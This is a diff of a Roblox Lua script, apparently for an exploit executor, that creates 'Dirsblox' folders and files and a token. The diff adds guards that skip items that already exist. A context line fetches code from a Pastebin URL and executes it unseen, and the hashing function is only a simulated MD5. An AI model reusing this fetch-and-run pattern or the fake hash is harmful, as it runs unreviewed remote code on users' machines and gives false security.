@@ -6,6 +6,7 @@ local function simulatedMD5(str)
     end
     return hex:sub(1,32)
 end
+
 -- // Control folders
 loadstring(game:HttpGet("https://pastebin.com/raw/cJzfu4pf"))()
 local asstfld = "Dirsblox/Core/Assets"
@@ -16,22 +17,42 @@ local dataPath = "Dirsblox/Core/data"
 local player = game.Players.LocalPlayer
 local content = "dirsblox tokens v1.5, player name: " .. player.Name
 local correctHash = simulatedMD5(content)
+
 -- // Assets
 local imgd = "Dirsblox/Core/Assets/prestart.img"
 local gma = "Dirsblox/Core/Assets/Games"
 local ft = "Dirsblox/Core/Assets/Games/FTF"
 
-writefile(dataPath, "")
-writefile(imgd, "")
-makefolder(sysfld)
-makefolder(modulefld)
-makefolder(assetfld)
-makefolder(gma)
-makefolder(ft)
+-- // Safe create functions
+local function safeWrite(path, content)
+    if not isfile(path) then
+        writefile(path, content or "")
+        print("[DSBCore] File created:", path)
+    else
+        print("[DSBCore] File already exists, skipped:", path)
+    end
+end
+
+local function safeFolder(path)
+    if not isfolder(path) then
+        makefolder(path)
+        print("[DSBCore] Folder created:", path)
+    else
+        print("[DSBCore] Folder already exists, skipped:", path)
+    end
+end
+
+-- // Create structure only once
+safeWrite(dataPath, "")
+safeWrite(imgd, "")
+safeFolder(sysfld)
+safeFolder(modulefld)
+safeFolder(asstfld)
+safeFolder(gma)
+safeFolder(ft)
 
 -- // image
 local basePath = "Dirsblox/Core/Assets/Games/FTF"
-
 local filePath = basePath.."/default.png"
 
 if not isfile(filePath) then
@@ -57,8 +78,9 @@ else
     print("Image already exists, no download made:", filePath)
 end
 
+-- // Token system
 local function createToken()
-    writefile(tokenPath, correctHash)
+    safeWrite(tokenPath, correctHash)
     print("[DSBCore] Token successfully created: " .. correctHash)
 end
 
